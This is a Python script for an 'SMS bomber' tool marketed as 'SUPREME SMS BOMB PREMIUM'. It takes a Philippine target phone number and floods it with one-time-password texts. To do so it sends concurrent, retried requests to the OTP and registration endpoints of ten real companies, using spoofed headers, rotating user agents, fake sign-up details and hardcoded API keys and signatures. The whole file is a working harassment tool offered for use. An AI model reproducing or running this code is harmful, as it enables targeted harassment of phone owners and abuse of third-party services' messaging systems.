import random
import string
import time
import sys
import re
import os
import json
import datetime
import getpass
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional
import logging
from dataclasses import dataclass
from termcolor import colored
from colorama import Fore, Back, Style, init
init(autoreset=True)

COLORS = {
    "BOLD": Style.BRIGHT,
    "RESET": Style.RESET_ALL,
    "BOLD": Style.BRIGHT,
    "RED": Fore.RED,
    "GREEN": Fore.GREEN,
    "YELLOW": Fore.YELLOW,
    "CYAN": Fore.CYAN,
    "WHITE": Fore.WHITE,
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    
clear_screen()

expiration_date = datetime(2090, 12, 31, 0, 0, 0)
current_date = datetime.now()

if current_date > expiration_date:
    expiration_text = f"Subscription expired {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}. Contact @Krampogii to renew."
    print(f"{Fore.RED}{Style.BRIGHT}• {expiration_text}")
    sys.exit()
else:
    days_left = (expiration_date - current_date).days
    expiration_text = f"{expiration_date.strftime('%Y-%m-%d %H:%M:%S')}"
    if days_left <= 5:
        print(f"{Fore.YELLOW}{Style.BRIGHT}Your subscription expires soon: {expiration_text} ({days_left} days left)")
    else:
        print(f"{Fore.GREEN}Subscription active until: {expiration_text}")

correct_password = "k"
user_password = getpass.getpass(f"\n{Fore.CYAN}Enter password to continue: {Style.RESET_ALL}")

if user_password != correct_password:
    print(f"{Fore.RED}Incorrect password{Style.RESET_ALL}")
    sys.exit()
    
clear_screen()

@dataclass
class APIResponse:
    service_name: str
    success: bool
    status_code: Optional[int] = None
    error_message: Optional[str] = None

class KRAM_SMS_BOMB_PREMIUM:
    def __init__(self):
        self.user_usage = {}
        self.FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
        self.FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
        self.max_retries = 3
        self.retry_delay = 1
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        
        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    def random_string(self, length: int) -> str:
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def validate_phone_number(self, number: str) -> bool:
        pattern = r'^(09\d{9}|9\d{9})$'
        return bool(re.match(pattern, number))
    
    def format_phone_number(self, number: str) -> str:
        return number.replace('0', '+63', 1) if number.startswith('0') else f'+63{number}'
    
    def display_banner(self):
        print('\n' + '=' * 60)
        print('🎯 SUPEREME SMS BOMMER PREMIUM')
        print('=' * 60)
        print('⚡ Professional SMS Tool')
        print('📱 Multiple Service Integration')
        print('🔄 Advanced Retry Mechanism')
        print('📊 Real-time Analytics')
        print('=' * 60)
    
    def make_api_request(self, api_call, *args, **kwargs) -> APIResponse:
        service_name = kwargs.get('service_name', 'Unknown')
        
        for attempt in range(self.max_retries + 1):
            try:
                result = api_call(*args)
                if len(result) == 3:
                    service_name, success, status_code = result
                    return APIResponse(
                        service_name=service_name,
                        success=success,
                        status_code=status_code
                    )
                else:
                    return APIResponse(
                        service_name=service_name,
                        success=False,
                        error_message="Invalid API response format"
                    )
            except requests.exceptions.RequestException as e:
                if attempt == self.max_retries:
                    return APIResponse(
                        service_name=service_name,
                        success=False,
                        error_message=f"Network error: {str(e)}"
                    )
                time.sleep(self.retry_delay * (attempt + 1))
            except Exception as e:
                return APIResponse(
                    service_name=service_name,
                    success=False,
                    error_message=f"Unexpected error: {str(e)}"
                )
        return APIResponse(
            service_name=service_name,
            success=False,
            error_message="Max retries exceeded"
        )
    
    def send_s5_request(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.s5.com/player/api/v1/otp/request'
            boundary = "----WebKitFormBoundary" + self.random_string(16)
            data = f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n{formatted_num}\r\n--{boundary}--\r\n'
            headers = {
                'authority': 'api.s5.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'access-control-allow-origin': '*',
                'cache-control': 'no-cache',
                'content-type': f'multipart/form-data; boundary={boundary}',
                'origin': 'https://www.s5.com',
                'pragma': 'no-cache',
                'referer': 'https://www.s5.com/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480'
            }
            response = requests.post(url, data=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "S5.com", success, response.status_code
        except Exception as e:
            return "S5.com", False, None
    
    def send_xpress_request(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp"
            data = {
                "FirstName": "toshi",
                "LastName": "premium",
                "Email": f"toshi{int(time.time())}@gmail.com",
                "Phone": formatted_num,
                "Password": "ToshiPass123",
                "ConfirmPassword": "ToshiPass123",
                "ImageUrl": "",
                "RoleIds": [4],
                "Area": "manila",
                "City": "manila",
                "PostalCode": "1000",
                "Street": "toshi_street",
                "ReferralCode": "",
                "FingerprintVisitorId": self.FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": self.FINGERPRINT_REQUEST_ID,
            }
            headers = {
                "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
                "Accept": "application/json",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
                "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
                "Cookie": "ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6",
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "Xpress PH", success, response.status_code
        except Exception as e:
            return "Xpress PH", False, None
    
    def send_abenson_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
            data = f'contact_no={number_to_send}&login_token=undefined'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'com.abensonmembership.cloone',
                'origin': 'https://localhost',
                'referer': 'https://localhost/'
            }
            response = requests.post(url, data=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "Abenson", success, response.status_code
        except Exception as e:
            return "Abenson", False, None
    
    def send_excellente_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock'
            coordinates = [
                {'lat': '14.5995', 'long': '120.9842'},
                {'lat': '14.6760', 'long': '121.0437'},
                {'lat': '14.8648', 'long': '121.0418'}
            ]
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'okhttp/3.12.1',
                'Dart/3.6 (dart:io)',
                'Mozilla/5.0 (Linux; Android 15)',
            ]
            coord = random.choice(coordinates)
            agent = random.choice(user_agents)
            data = {
                "domain": number_to_send,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
            headers = {
                'User-Agent': agent,
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json; charset=utf-8',
                'x-version': '1.1.2',
                'x-package-name': 'com.support.excellenteralending',
                'x-adid': 'efe35521e51f924efcad5d61d61072a9',
                'x-latitude': coord['lat'],
                'x-longitude': coord['long']
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "Excellente Lending", success, response.status_code
        except Exception as e:
            return "Excellente Lending", False, None
    
    def send_fortunepay_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
            data = {
                "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
                "deviceType": 'GOOGLE_PLAY',
                "companyId": '4bf735e97269421a80b82359e7dc2288',
                "dialCode": '+63',
                "phoneNumber": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
                'app-version': '4.3.5',
                'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
                'timestamp': str(int(time.time() * 1000)),
                'nonce': f"{self.random_string(10)}-{int(time.time() * 1000)}"
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "FortunePay", success, response.status_code
        except Exception as e:
            return "FortunePay", False, None
    
    def send_wemove_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.wemove.com.ph/auth/users'
            data = {
                "phone_country": '+63',
                "phone_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "WeMove", success, response.status_code
        except Exception as e:
            return "WeMove", False, None
    
    def send_lbc_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
            data = {
                'verification_type': 'mobile',
                'client_email': f'{self.random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send,
                'app_log_uid': self.random_string(16),
                'app_token': '',
                'app_platform': 'Android',
                'app_ip': '103.167.66.190',
                'device_name': 'rosemary_p_global',
                'device_os': 'Android15',
                'device_brand': 'Xiaomi',
                'app_version': '3.0.67',
                'app_framework': 'lbc_app',
                'app_environment': 'production',
                'app_hash': self.random_string(32),
                'app_network': 'android-parameter'
            }
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'api': 'LBC',
                'token': 'CONNECT'
            }
            response = requests.post(url, data=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "LBC", success, response.status_code
        except Exception as e:
            return "LBC", False, None
    
    def send_pickup_coffee_request(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://production.api.pickup-coffee.net/v2/customers/login'
            app_versions = ['2.6.4', '2.6.5', '2.7.0']
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'okhttp/3.12.1',
                'Dart/3.6 (dart:io)',
                'Mozilla/5.0 (Linux; Android 15)',
            ]
            data = {
                "mobile_number": formatted_num,
                "login_method": 'mobile_number'
            }
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-env': 'Production',
                'x-app-version': random.choice(app_versions)
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "Pickup Coffee", success, response.status_code
        except Exception as e:
            return "Pickup Coffee", False, None
    
    def send_honeyloan_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.honeyloan.ph/api/client/registration/step-one'
            data = {
                "phone": number_to_send,
                "is_rights_block_accepted": 1
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Content-Type': 'application/json',
                'origin': 'https://honeyloan.ph',
                'referer': 'https://honeyloan.ph/',
                'x-requested-with': 'com.startupcalculator.caf'
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "HoneyLoan", success, response.status_code
        except Exception as e:
            return "HoneyLoan", False, None
    
    def send_komo_request(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.komo.ph/api/otp/v5/generate'
            data = {
                "mobile": number_to_send,
                "transactionType": 6
            }
            headers = {
                'Connection': 'close',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            }
            response = requests.post(url, json=data, headers=headers, timeout=10)
            success = 200 <= response.status_code < 300
            return "Komo", success, response.status_code
        except Exception as e:
            return "Komo", False, None

    def get_all_services(self) -> List[callable]:
        """Return all available service functions"""
        return [
            lambda: self.make_api_request(self.send_s5_request, self.formatted_num, service_name="S5.com"),
            lambda: self.make_api_request(self.send_xpress_request, self.formatted_num, service_name="Xpress PH"),
            lambda: self.make_api_request(self.send_abenson_request, self.number_to_send, service_name="Abenson"),
            lambda: self.make_api_request(self.send_excellente_request, self.number_to_send, service_name="Excellente Lending"),
            lambda: self.make_api_request(self.send_fortunepay_request, self.number_to_send, service_name="FortunePay"),
            lambda: self.make_api_request(self.send_wemove_request, self.number_to_send, service_name="WeMove"),
            lambda: self.make_api_request(self.send_lbc_request, self.number_to_send, service_name="LBC"),
            lambda: self.make_api_request(self.send_pickup_coffee_request, self.formatted_num, service_name="Pickup Coffee"),
            lambda: self.make_api_request(self.send_honeyloan_request, self.number_to_send, service_name="HoneyLoan"),
            lambda: self.make_api_request(self.send_komo_request, self.number_to_send, service_name="Komo"),
        ]

    def execute_continuous_bombing(self, number_to_send: str, total_requests: int):
        """Execute continuous SMS bombing without batches"""
        self.number_to_send = number_to_send
        self.formatted_num = self.format_phone_number(number_to_send)
        self.start_time = time.time()
        
        print('\n🚀 SUPRREME SMS BOMB PREMIUM - INITIATING')
        print('=' * 50)
        print(f'📞 Target Number: {number_to_send}')
        print(f'🎯 Total Requests: {total_requests}')
        print(f'🔄 Max Retries: {self.max_retries}')
        print(f'⚡ Concurrent Workers: 8')
        print('=' * 50)
        print('\n🔄 Starting continuous bombardment...\n')
        
        all_services = self.get_all_services()
        completed_requests = 0
        
        with ThreadPoolExecutor(max_workers=8) as executor:
            while completed_requests < total_requests:
                # Submit all services for this round
                future_to_service = {}
                for service_func in all_services:
                    if completed_requests >= total_requests:
                        break
                    future = executor.submit(service_func)
                    future_to_service[future] = completed_requests
                    completed_requests += 1
                
                # Process completed requests
                for future in as_completed(future_to_service):
                    try:
                        api_response = future.result()
                        self.total_requests += 1
                        
                        if api_response.success:
                            self.successful_requests += 1
                            status_info = f" (Status: {api_response.status_code})" if api_response.status_code else ""
                            print(f'✅ [{self.total_requests:03d}] {api_response.service_name}: SUCCESS{status_info}')
                        else:
                            self.failed_requests += 1
                            error_info = f" - {api_response.error_message}" if api_response.error_message else ""
                            print(f'❌ [{self.total_requests:03d}] {api_response.service_name}: FAILED{error_info}')
                        
                        # Display real-time stats
                        if self.total_requests % 5 == 0:
                            self.display_real_time_stats()
                            
                    except Exception as e:
                        self.total_requests += 1
                        self.failed_requests += 1
                        print(f'❌ [{self.total_requests:03d}] Unknown Service: FAILED - {str(e)}')
                
                # Dynamic delay between rounds
                if completed_requests < total_requests:
                    delay = random.uniform(0.5, 1.5)
                    time.sleep(delay)
    
    def display_real_time_stats(self):
        """Display real-time statistics"""
        elapsed_time = time.time() - self.start_time
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
        requests_per_second = self.total_requests / elapsed_time if elapsed_time > 0 else 0
        
        print(f'\n📊 REAL-TIME STATS | Success: {self.successful_requests} | Failed: {self.failed_requests} | Total: {self.total_requests}')
        print(f'📈 Success Rate: {success_rate:.1f}% | Speed: {requests_per_second:.1f} req/s | Elapsed: {elapsed_time:.1f}s')
        print('-' * 60)
    
    def display_final_report(self):
        """Display comprehensive final report"""
        elapsed_time = time.time() - self.start_time
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
        requests_per_second = self.total_requests / elapsed_time if elapsed_time > 0 else 0
        
        print('\n' + '=' * 60)
        print('🎯 SUPREME SMS BOMB PREMIUM - MISSION COMPLETE')
        print('=' * 60)
        print(f'✅ SUCCESSFUL REQUESTS: {self.successful_requests}')
        print(f'❌ FAILED REQUESTS: {self.failed_requests}')
        print(f'📊 TOTAL REQUESTS: {self.total_requests}')
        print(f'🎯 SUCCESS RATE: {success_rate:.1f}%')
        print(f'⚡ AVERAGE SPEED: {requests_per_second:.1f} requests/second')
        print(f'⏰ TOTAL DURATION: {elapsed_time:.1f} seconds')
        print(f'📞 TARGET NUMBER: {self.number_to_send}')
        print(f'🕒 COMPLETION TIME: {time.strftime("%Y-%m-%d %H:%M:%S")}')
        print('=' * 60)
        
        # Performance rating
        if success_rate >= 80:
            rating = "EXCELLENT 🏆"
        elif success_rate >= 60:
            rating = "GOOD 👍"
        elif success_rate >= 40:
            rating = "FAIR 👌"
        else:
            rating = "POOR ⚠️"
        
        print(f'🏆 PERFORMANCE RATING: {rating}')
        print('=' * 60)
        
        self.logger.info(f"Mission completed: {self.successful_requests}/{self.total_requests} successful ({success_rate:.1f}%)")
    
    def run(self):
        self.display_banner()
        
        try:
            # Get target number
            number_input = input('\n📱 Enter target phone number (e.g., 09812345678): ').strip()
            
            if not self.validate_phone_number(number_input):
                print('❌ INVALID PHONE NUMBER FORMAT!')
                print('💡 Must be 10-11 digits starting with 09 or 9')
                return
            
            # Get number of requests
            try:
                requests_input = input('🎯 Enter total number of requests: ').strip()
                total_requests = int(requests_input)
                
                if total_requests <= 0:
                    print('❌ Number of requests must be positive!')
                    return
                    
                if total_requests > 1000:
                    print('⚠️ HIGH VOLUME DETECTED! This may trigger rate limiting.')
                    confirm = input('🚀 CONTINUE WITH KRAM PREMIUM? (y/N): ').lower()
                    if confirm != 'y':
                        print('✅ Operation cancelled safely.')
                        return
                
                # Confirm mission
                print(f'\n⚠️  MISSION CONFIRMATION:')
                print(f'📞 Target: {number_input}')
                print(f'🎯 Requests: {total_requests}')
                print(f'🔄 Retries: {self.max_retries}')
                
                confirm = input('\n🚀 LAUNCH KRAM SMS BOMB PREMIUM? (y/N): ').lower()
                if confirm != 'y':
                    print('✅ Mission aborted.')
                    return
                
                # Execute bombing
                self.execute_continuous_bombing(number_input, total_requests)
                self.display_final_report()
                
            except ValueError:
                print('❌ Please enter a valid number!')
                
        except KeyboardInterrupt:
            print('\n\n❌ MISSION INTERRUPTED BY USER')
            if self.total_requests > 0:
                self.display_final_report()
        except Exception as e:
            print(f'❌ CRITICAL ERROR: {e}')
            self.logger.error(f"Critical error: {e}")

def main():
    try:
        kram_bomb = KRAM_SMS_BOMB_PREMIUM()
        kram_bomb.run()
    except KeyboardInterrupt:
        print('\n\n👋 THANK YOU FOR USING SUPREME SMS BOMB PREMIUM!')
    except Exception as e:
        print(f"💥 FATAL ERROR: {e}")
        logging.error(f"Fatal error: {e}")

if __name__ == "__main__":
    main()